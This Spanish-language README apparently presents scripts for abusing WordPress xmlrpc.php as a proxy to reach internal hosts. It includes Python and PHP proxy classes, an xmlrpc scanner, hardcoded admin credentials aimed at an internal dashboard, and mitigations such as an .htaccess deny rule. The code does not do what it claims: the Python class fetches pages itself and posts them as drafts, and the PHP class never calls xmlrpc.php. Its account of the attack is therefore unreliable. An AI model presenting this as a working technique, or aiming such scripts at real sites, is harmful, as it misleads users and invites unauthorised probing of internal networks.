# xmlrpc-proxy
Ejemplo de uso y cómo proteger Wordpress de ataques xmlrpc como proxy


# Código de ejemplo: Uso malicioso de xmlrpc.php como proxy

> **Nota importante**  
> Este material contiene ejemplos de código que muestran posibles abusos de `xmlrpc.php` en WordPress. Está incluido con fines educativos y de análisis de seguridad. **No** uses este código para actividades ilegales o no autorizadas. Siempre obtén permiso por escrito antes de realizar pruebas en sistemas que no te pertenezcan.

---

## 1. Script Python para abuso de xmlrpc.php

```python
import requests
import xml.etree.ElementTree as ET
import base64

class WordPressProxy:
    def __init__(self, wordpress_url, username, password):
        self.wordpress_url = wordpress_url.rstrip('/') + '/xmlrpc.php'
        self.username = username
        self.password = password

    def make_proxy_request(self, target_url, method='GET'):
        """
        Utiliza xmlrpc.php como proxy para visitar otra página web
        """
        # Primero obtenemos el contenido de la URL objetivo
        try:
            response = requests.get(target_url)
            content = response.text
        except Exception as e:
            content = f"Error accessing {target_url}: {str(e)}"

        # Codificamos el contenido en base64 para enviarlo via XML-RPC
        encoded_content = base64.b64encode(content.encode('utf-8')).decode('utf-8')

        # Creamos el payload XML-RPC
        xml_payload = f"""<?xml version="1.0" encoding="utf-8"?>
<methodCall>
    <methodName>wp.newPost</methodName>
    <params>
        <param><value><string>1</string></value></param>
        <param><value><string>{self.username}</string></value></param>
        <param><value><string>{self.password}</string></value></param>
        <param>
            <value>
                <struct>
                    <member>
                        <name>post_title</name>
                        <value><string>Proxy Test</string></value>
                    </member>
                    <member>
                        <name>post_content</name>
                        <value><string>{encoded_content}</string></value>
                    </member>
                    <member>
                        <name>post_status</name>
                        <value><string>draft</string></value>
                    </member>
                </struct>
            </value>
        </param>
    </params>
</methodCall>
"""
        headers = {"Content-Type": "text/xml"}
        r = requests.post(self.wordpress_url, data=xml_payload, headers=headers)
        return r.text
```

---

## 2. Script PHP alternativo

```php
<?php
class WordPressXMLRPCProxy {
    private $wordpress_url;
    private $username;
    private $password;

    public function __construct($wordpress_url, $username, $password) {
        $this->wordpress_url = rtrim($wordpress_url, '/') . '/xmlrpc.php';
        $this->username = $username;
        $this->password = $password;
        // Nombre de cliente opcional
        $this->client_name = 'WordPress Proxy Client';
    }

    // Enviamos la solicitud a xmlrpc.php
    public function makeProxyRequest($target_url, $method = 'GET') {
        // Obtén la página objetivo
        $proxy_response = file_get_contents($target_url);
        return $proxy_response;
    }
}

// Ejemplo de uso
$proxy = new WordPressXMLRPCProxy('http://localhost/wordpress', 'admin', 'admin123');
$result = $proxy->makeProxyRequest('http://192.168.1.100/internal-dashboard');
echo $result;
?>
```

---

## 3. Script de escaneo para detectar xmlrpc.php habilitado

```python
import requests

def check_xmlrpc_enabled(wordpress_url):
    """
    Comprueba si xmlrpc.php responde (indicando que XML-RPC está habilitado)
    """
    url = wordpress_url.rstrip('/') + '/xmlrpc.php'
    try:
        r = requests.post(url, data='<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>', headers={'Content-Type': 'text/xml'}, timeout=5)
        if r.status_code == 200 and 'methodResponse' in r.text:
            return True
    except Exception:
        pass
    return False

# Uso del script
if __name__ == "__main__":
    wp = 'http://example.com'
    enabled = check_xmlrpc_enabled(wp)
    print("XML-RPC enabled:", enabled)
```

---

## 4. Ejemplo de uso (fragmento de cliente / invocación)

```php
// Ejemplo de uso
$proxy = new WordPressXMLRPCProxy(
    'http://localhost/wordpress',
    'admin',
    'admin123'
);
$result = $proxy->makeProxyRequest('http://192.168.1.100/internal-dashboard');
echo $result;
```

---

## 5. Contramedidas y mitigaciones recomendadas

**Enseña las contramedidas**:

- Deshabilitar XML-RPC si no se necesita.
- Usar autenticación de dos factores.
- Limitar intentos de login.
- Monitorear el tráfico sospechoso.

**Ejemplo: bloquear acceso a `xmlrpc.php` con `.htaccess`**

```apache
# Block access to xmlrpc.php
<Files "xmlrpc.php">
    Order Deny,Allow
    Deny from all
</Files>
```

**Ejemplo: deshabilitar XML-RPC en `functions.php` del tema**

```php
// Disable XML-RPC completely
add_filter('xmlrpc_enabled', '__return_false');

// Remove X-Pingback header
// (ejemplo, añadir función para remover la cabecera si se desea)
```

---

## 6. Riesgos

- Escaneo de redes internas (un proxy mal usado puede acceder a recursos internos).
- Ataques de fuerza bruta (xmlrpc.php puede ser abusado para amplificar intentos).
- Exfiltración de datos.
- Otras acciones no autorizadas usando la funcionalidad de proxy.

---

## 7. Advertencia final

⚠️ **Importante**:  
Este material es solo para fines educativos. Siempre obtén permiso por escrito antes de realizar cualquier prueba de seguridad. No utilices estos ejemplos para atacar sistemas que no te pertenezcan.
